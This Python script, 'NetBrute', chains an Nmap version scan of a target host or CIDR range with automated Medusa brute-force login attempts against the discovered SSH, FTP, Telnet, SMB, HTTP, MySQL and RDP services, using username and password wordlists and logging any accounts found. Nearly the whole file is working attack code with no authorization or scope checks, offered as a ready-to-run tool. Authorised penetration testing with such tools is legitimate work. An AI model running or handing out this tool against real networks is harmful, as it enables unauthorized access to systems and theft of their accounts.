#!/usr/bin/env python3

import argparse
import subprocess
import xml.etree.ElementTree as ET
import os
import sys
import logging
from datetime import datetime

# Setup logging
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(levelname)s - %(message)s',
    handlers=[
        logging.FileHandler('netbrute.log'),
        logging.StreamHandler()
    ]
)
logger = logging.getLogger(__name__)

def check_dependencies():
    """Check if required tools (nmap, medusa) are installed."""
    try:
        subprocess.run(['nmap', '--version'], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        subprocess.run(['medusa', '-h'], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    except FileNotFoundError:
        logger.error("Required tools (nmap and/or medusa) not found. Please install them.")
        sys.exit(1)

def run_nmap_scan(target, output_file):
    """Run Nmap scan and save output in XML format."""
    logger.info(f"Starting Nmap scan on {target}")
    try:
        cmd = [
            'nmap', '-sV', '-oX', output_file, target
        ]
        subprocess.run(cmd, check=True, stdout=subprocess.DEVNULL, stderr=subprocess.PIPE)
        logger.info(f"Nmap scan completed. Output saved to {output_file}")
    except subprocess.CalledProcessError as e:
        logger.error(f"Nmap scan failed: {e.stderr.decode()}")
        sys.exit(1)

def parse_nmap_output(xml_file):
    """Parse Nmap XML output to extract hosts, ports, and services."""
    services = []
    try:
        tree = ET.parse(xml_file)
        root = tree.getroot()
        for host in root.findall('host'):
            ip = host.find('address').get('addr')
            for port in host.findall('.//port'):
                port_id = port.get('portid')
                protocol = port.get('protocol')
                service = port.find('service').get('name') if port.find('service') is not None else 'unknown'
                state = port.find('state').get('state')
                if state == 'open':
                    services.append({
                        'ip': ip,
                        'port': port_id,
                        'protocol': protocol,
                        'service': service
                    })
        logger.info(f"Parsed {len(services)} open services from Nmap output")
        return services
    except ET.ParseError:
        logger.error(f"Error parsing Nmap XML file: {xml_file}")
        sys.exit(1)

def run_medusa_bruteforce(service, user_list, pass_list, threads):
    """Run Medusa brute-force attack against a service."""
    ip = service['ip']
    port = service['port']
    service_name = service['service']
    
    # Map services to Medusa modules
    service_map = {
        'ssh': 'ssh',
        'ftp': 'ftp',
        'telnet': 'telnet',
        'smb': 'smbnt',
        'http': 'http',
        'https': 'http',
        'mysql': 'mysql',
        'rdp': 'rdp'
    }
    
    module = service_map.get(service_name)
    if not module:
        logger.warning(f"No Medusa module for service {service_name} on {ip}:{port}")
        return

    logger.info(f"Starting brute-force on {service_name} at {ip}:{port}")
    
    output_dir = 'netbrute-output'
    os.makedirs(output_dir, exist_ok=True)
    output_file = os.path.join(output_dir, f"{ip}_{port}_{service_name}_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt")

    try:
        cmd = [
            'medusa',
            '-h', ip,
            '-n', port,
            '-M', module,
            '-U', user_list,
            '-P', pass_list,
            '-t', str(threads),
            '-O', output_file
        ]
        if service_name in ['http', 'https']:
            cmd.extend(['-m', 'PATH:/'])
        
        result = subprocess.run(cmd, capture_output=True, text=True)
        logger.info(f"Brute-force completed for {service_name} at {ip}:{port}. Results saved to {output_file}")
        
        # Check output for successful credentials
        with open(output_file, 'r') as f:
            output = f.read()
            if "ACCOUNT FOUND" in output:
                logger.info(f"Credentials found for {service_name} at {ip}:{port}! Check {output_file}")
            else:
                logger.info(f"No credentials found for {service_name} at {ip}:{port}")
                
    except subprocess.CalledProcessError as e:
        logger.error(f"Medusa brute-force failed for {service_name} at {ip}:{port}: {e.stderr}")
    except FileNotFoundError:
        logger.error(f"Output file {output_file} not created")

def main():
    parser = argparse.ArgumentParser(
        description="NetBrute: A tool for port scanning and automated brute-forcing of network services.",
        epilog="Example: ./netbrute.py -t 192.168.1.0/24 -u users.txt -p passwords.txt -T 5"
    )
    parser.add_argument('-t', '--target', help="Target IP or CIDR range for scanning")
    parser.add_argument('-f', '--file', help="Nmap XML output file to process")
    parser.add_argument('-u', '--user-list', default='/usr/share/wordlists/users.txt', 
                       help="File containing usernames (default: /usr/share/wordlists/users.txt)")
    parser.add_argument('-p', '--pass-list', default='/usr/share/wordlists/passwords.txt', 
                       help="File containing passwords (default: /usr/share/wordlists/passwords.txt)")
    parser.add_argument('-T', '--threads', type=int, default=5, 
                       help="Number of threads for brute-forcing (default: 5)")
    parser.add_argument('-o', '--output', default='nmap_output.xml', 
                       help="Nmap XML output file name (default: nmap_output.xml)")

    args = parser.parse_args()

    check_dependencies()

    if not args.target and not args.file:
        parser.error("Either --target or --file must be specified")

    # Validate wordlist files
    for file_path in [args.user_list, args.pass_list]:
        if not os.path.isfile(file_path):
            logger.error(f"Wordlist file not found: {file_path}")
            sys.exit(1)

    # Run Nmap scan if target is specified
    if args.target:
        run_nmap_scan(args.target, args.output)
        xml_file = args.output
    else:
        xml_file = args.file

    # Parse Nmap output
    if not os.path.isfile(xml_file):
        logger.error(f"Nmap output file not found: {xml_file}")
        sys.exit(1)

    services = parse_nmap_output(xml_file)

    if not services:
        logger.warning("No open services found to brute-force")
        sys.exit(0)

    # Perform brute-force attacks
    for service in services:
        run_medusa_bruteforce(service, args.user_list, args.pass_list, args.threads)

if __name__ == "__main__":
    print("""
    ==============================
          NetBrute v1.0
    Network Scanning & Brute-Forcing
    ==============================
    """)
    main()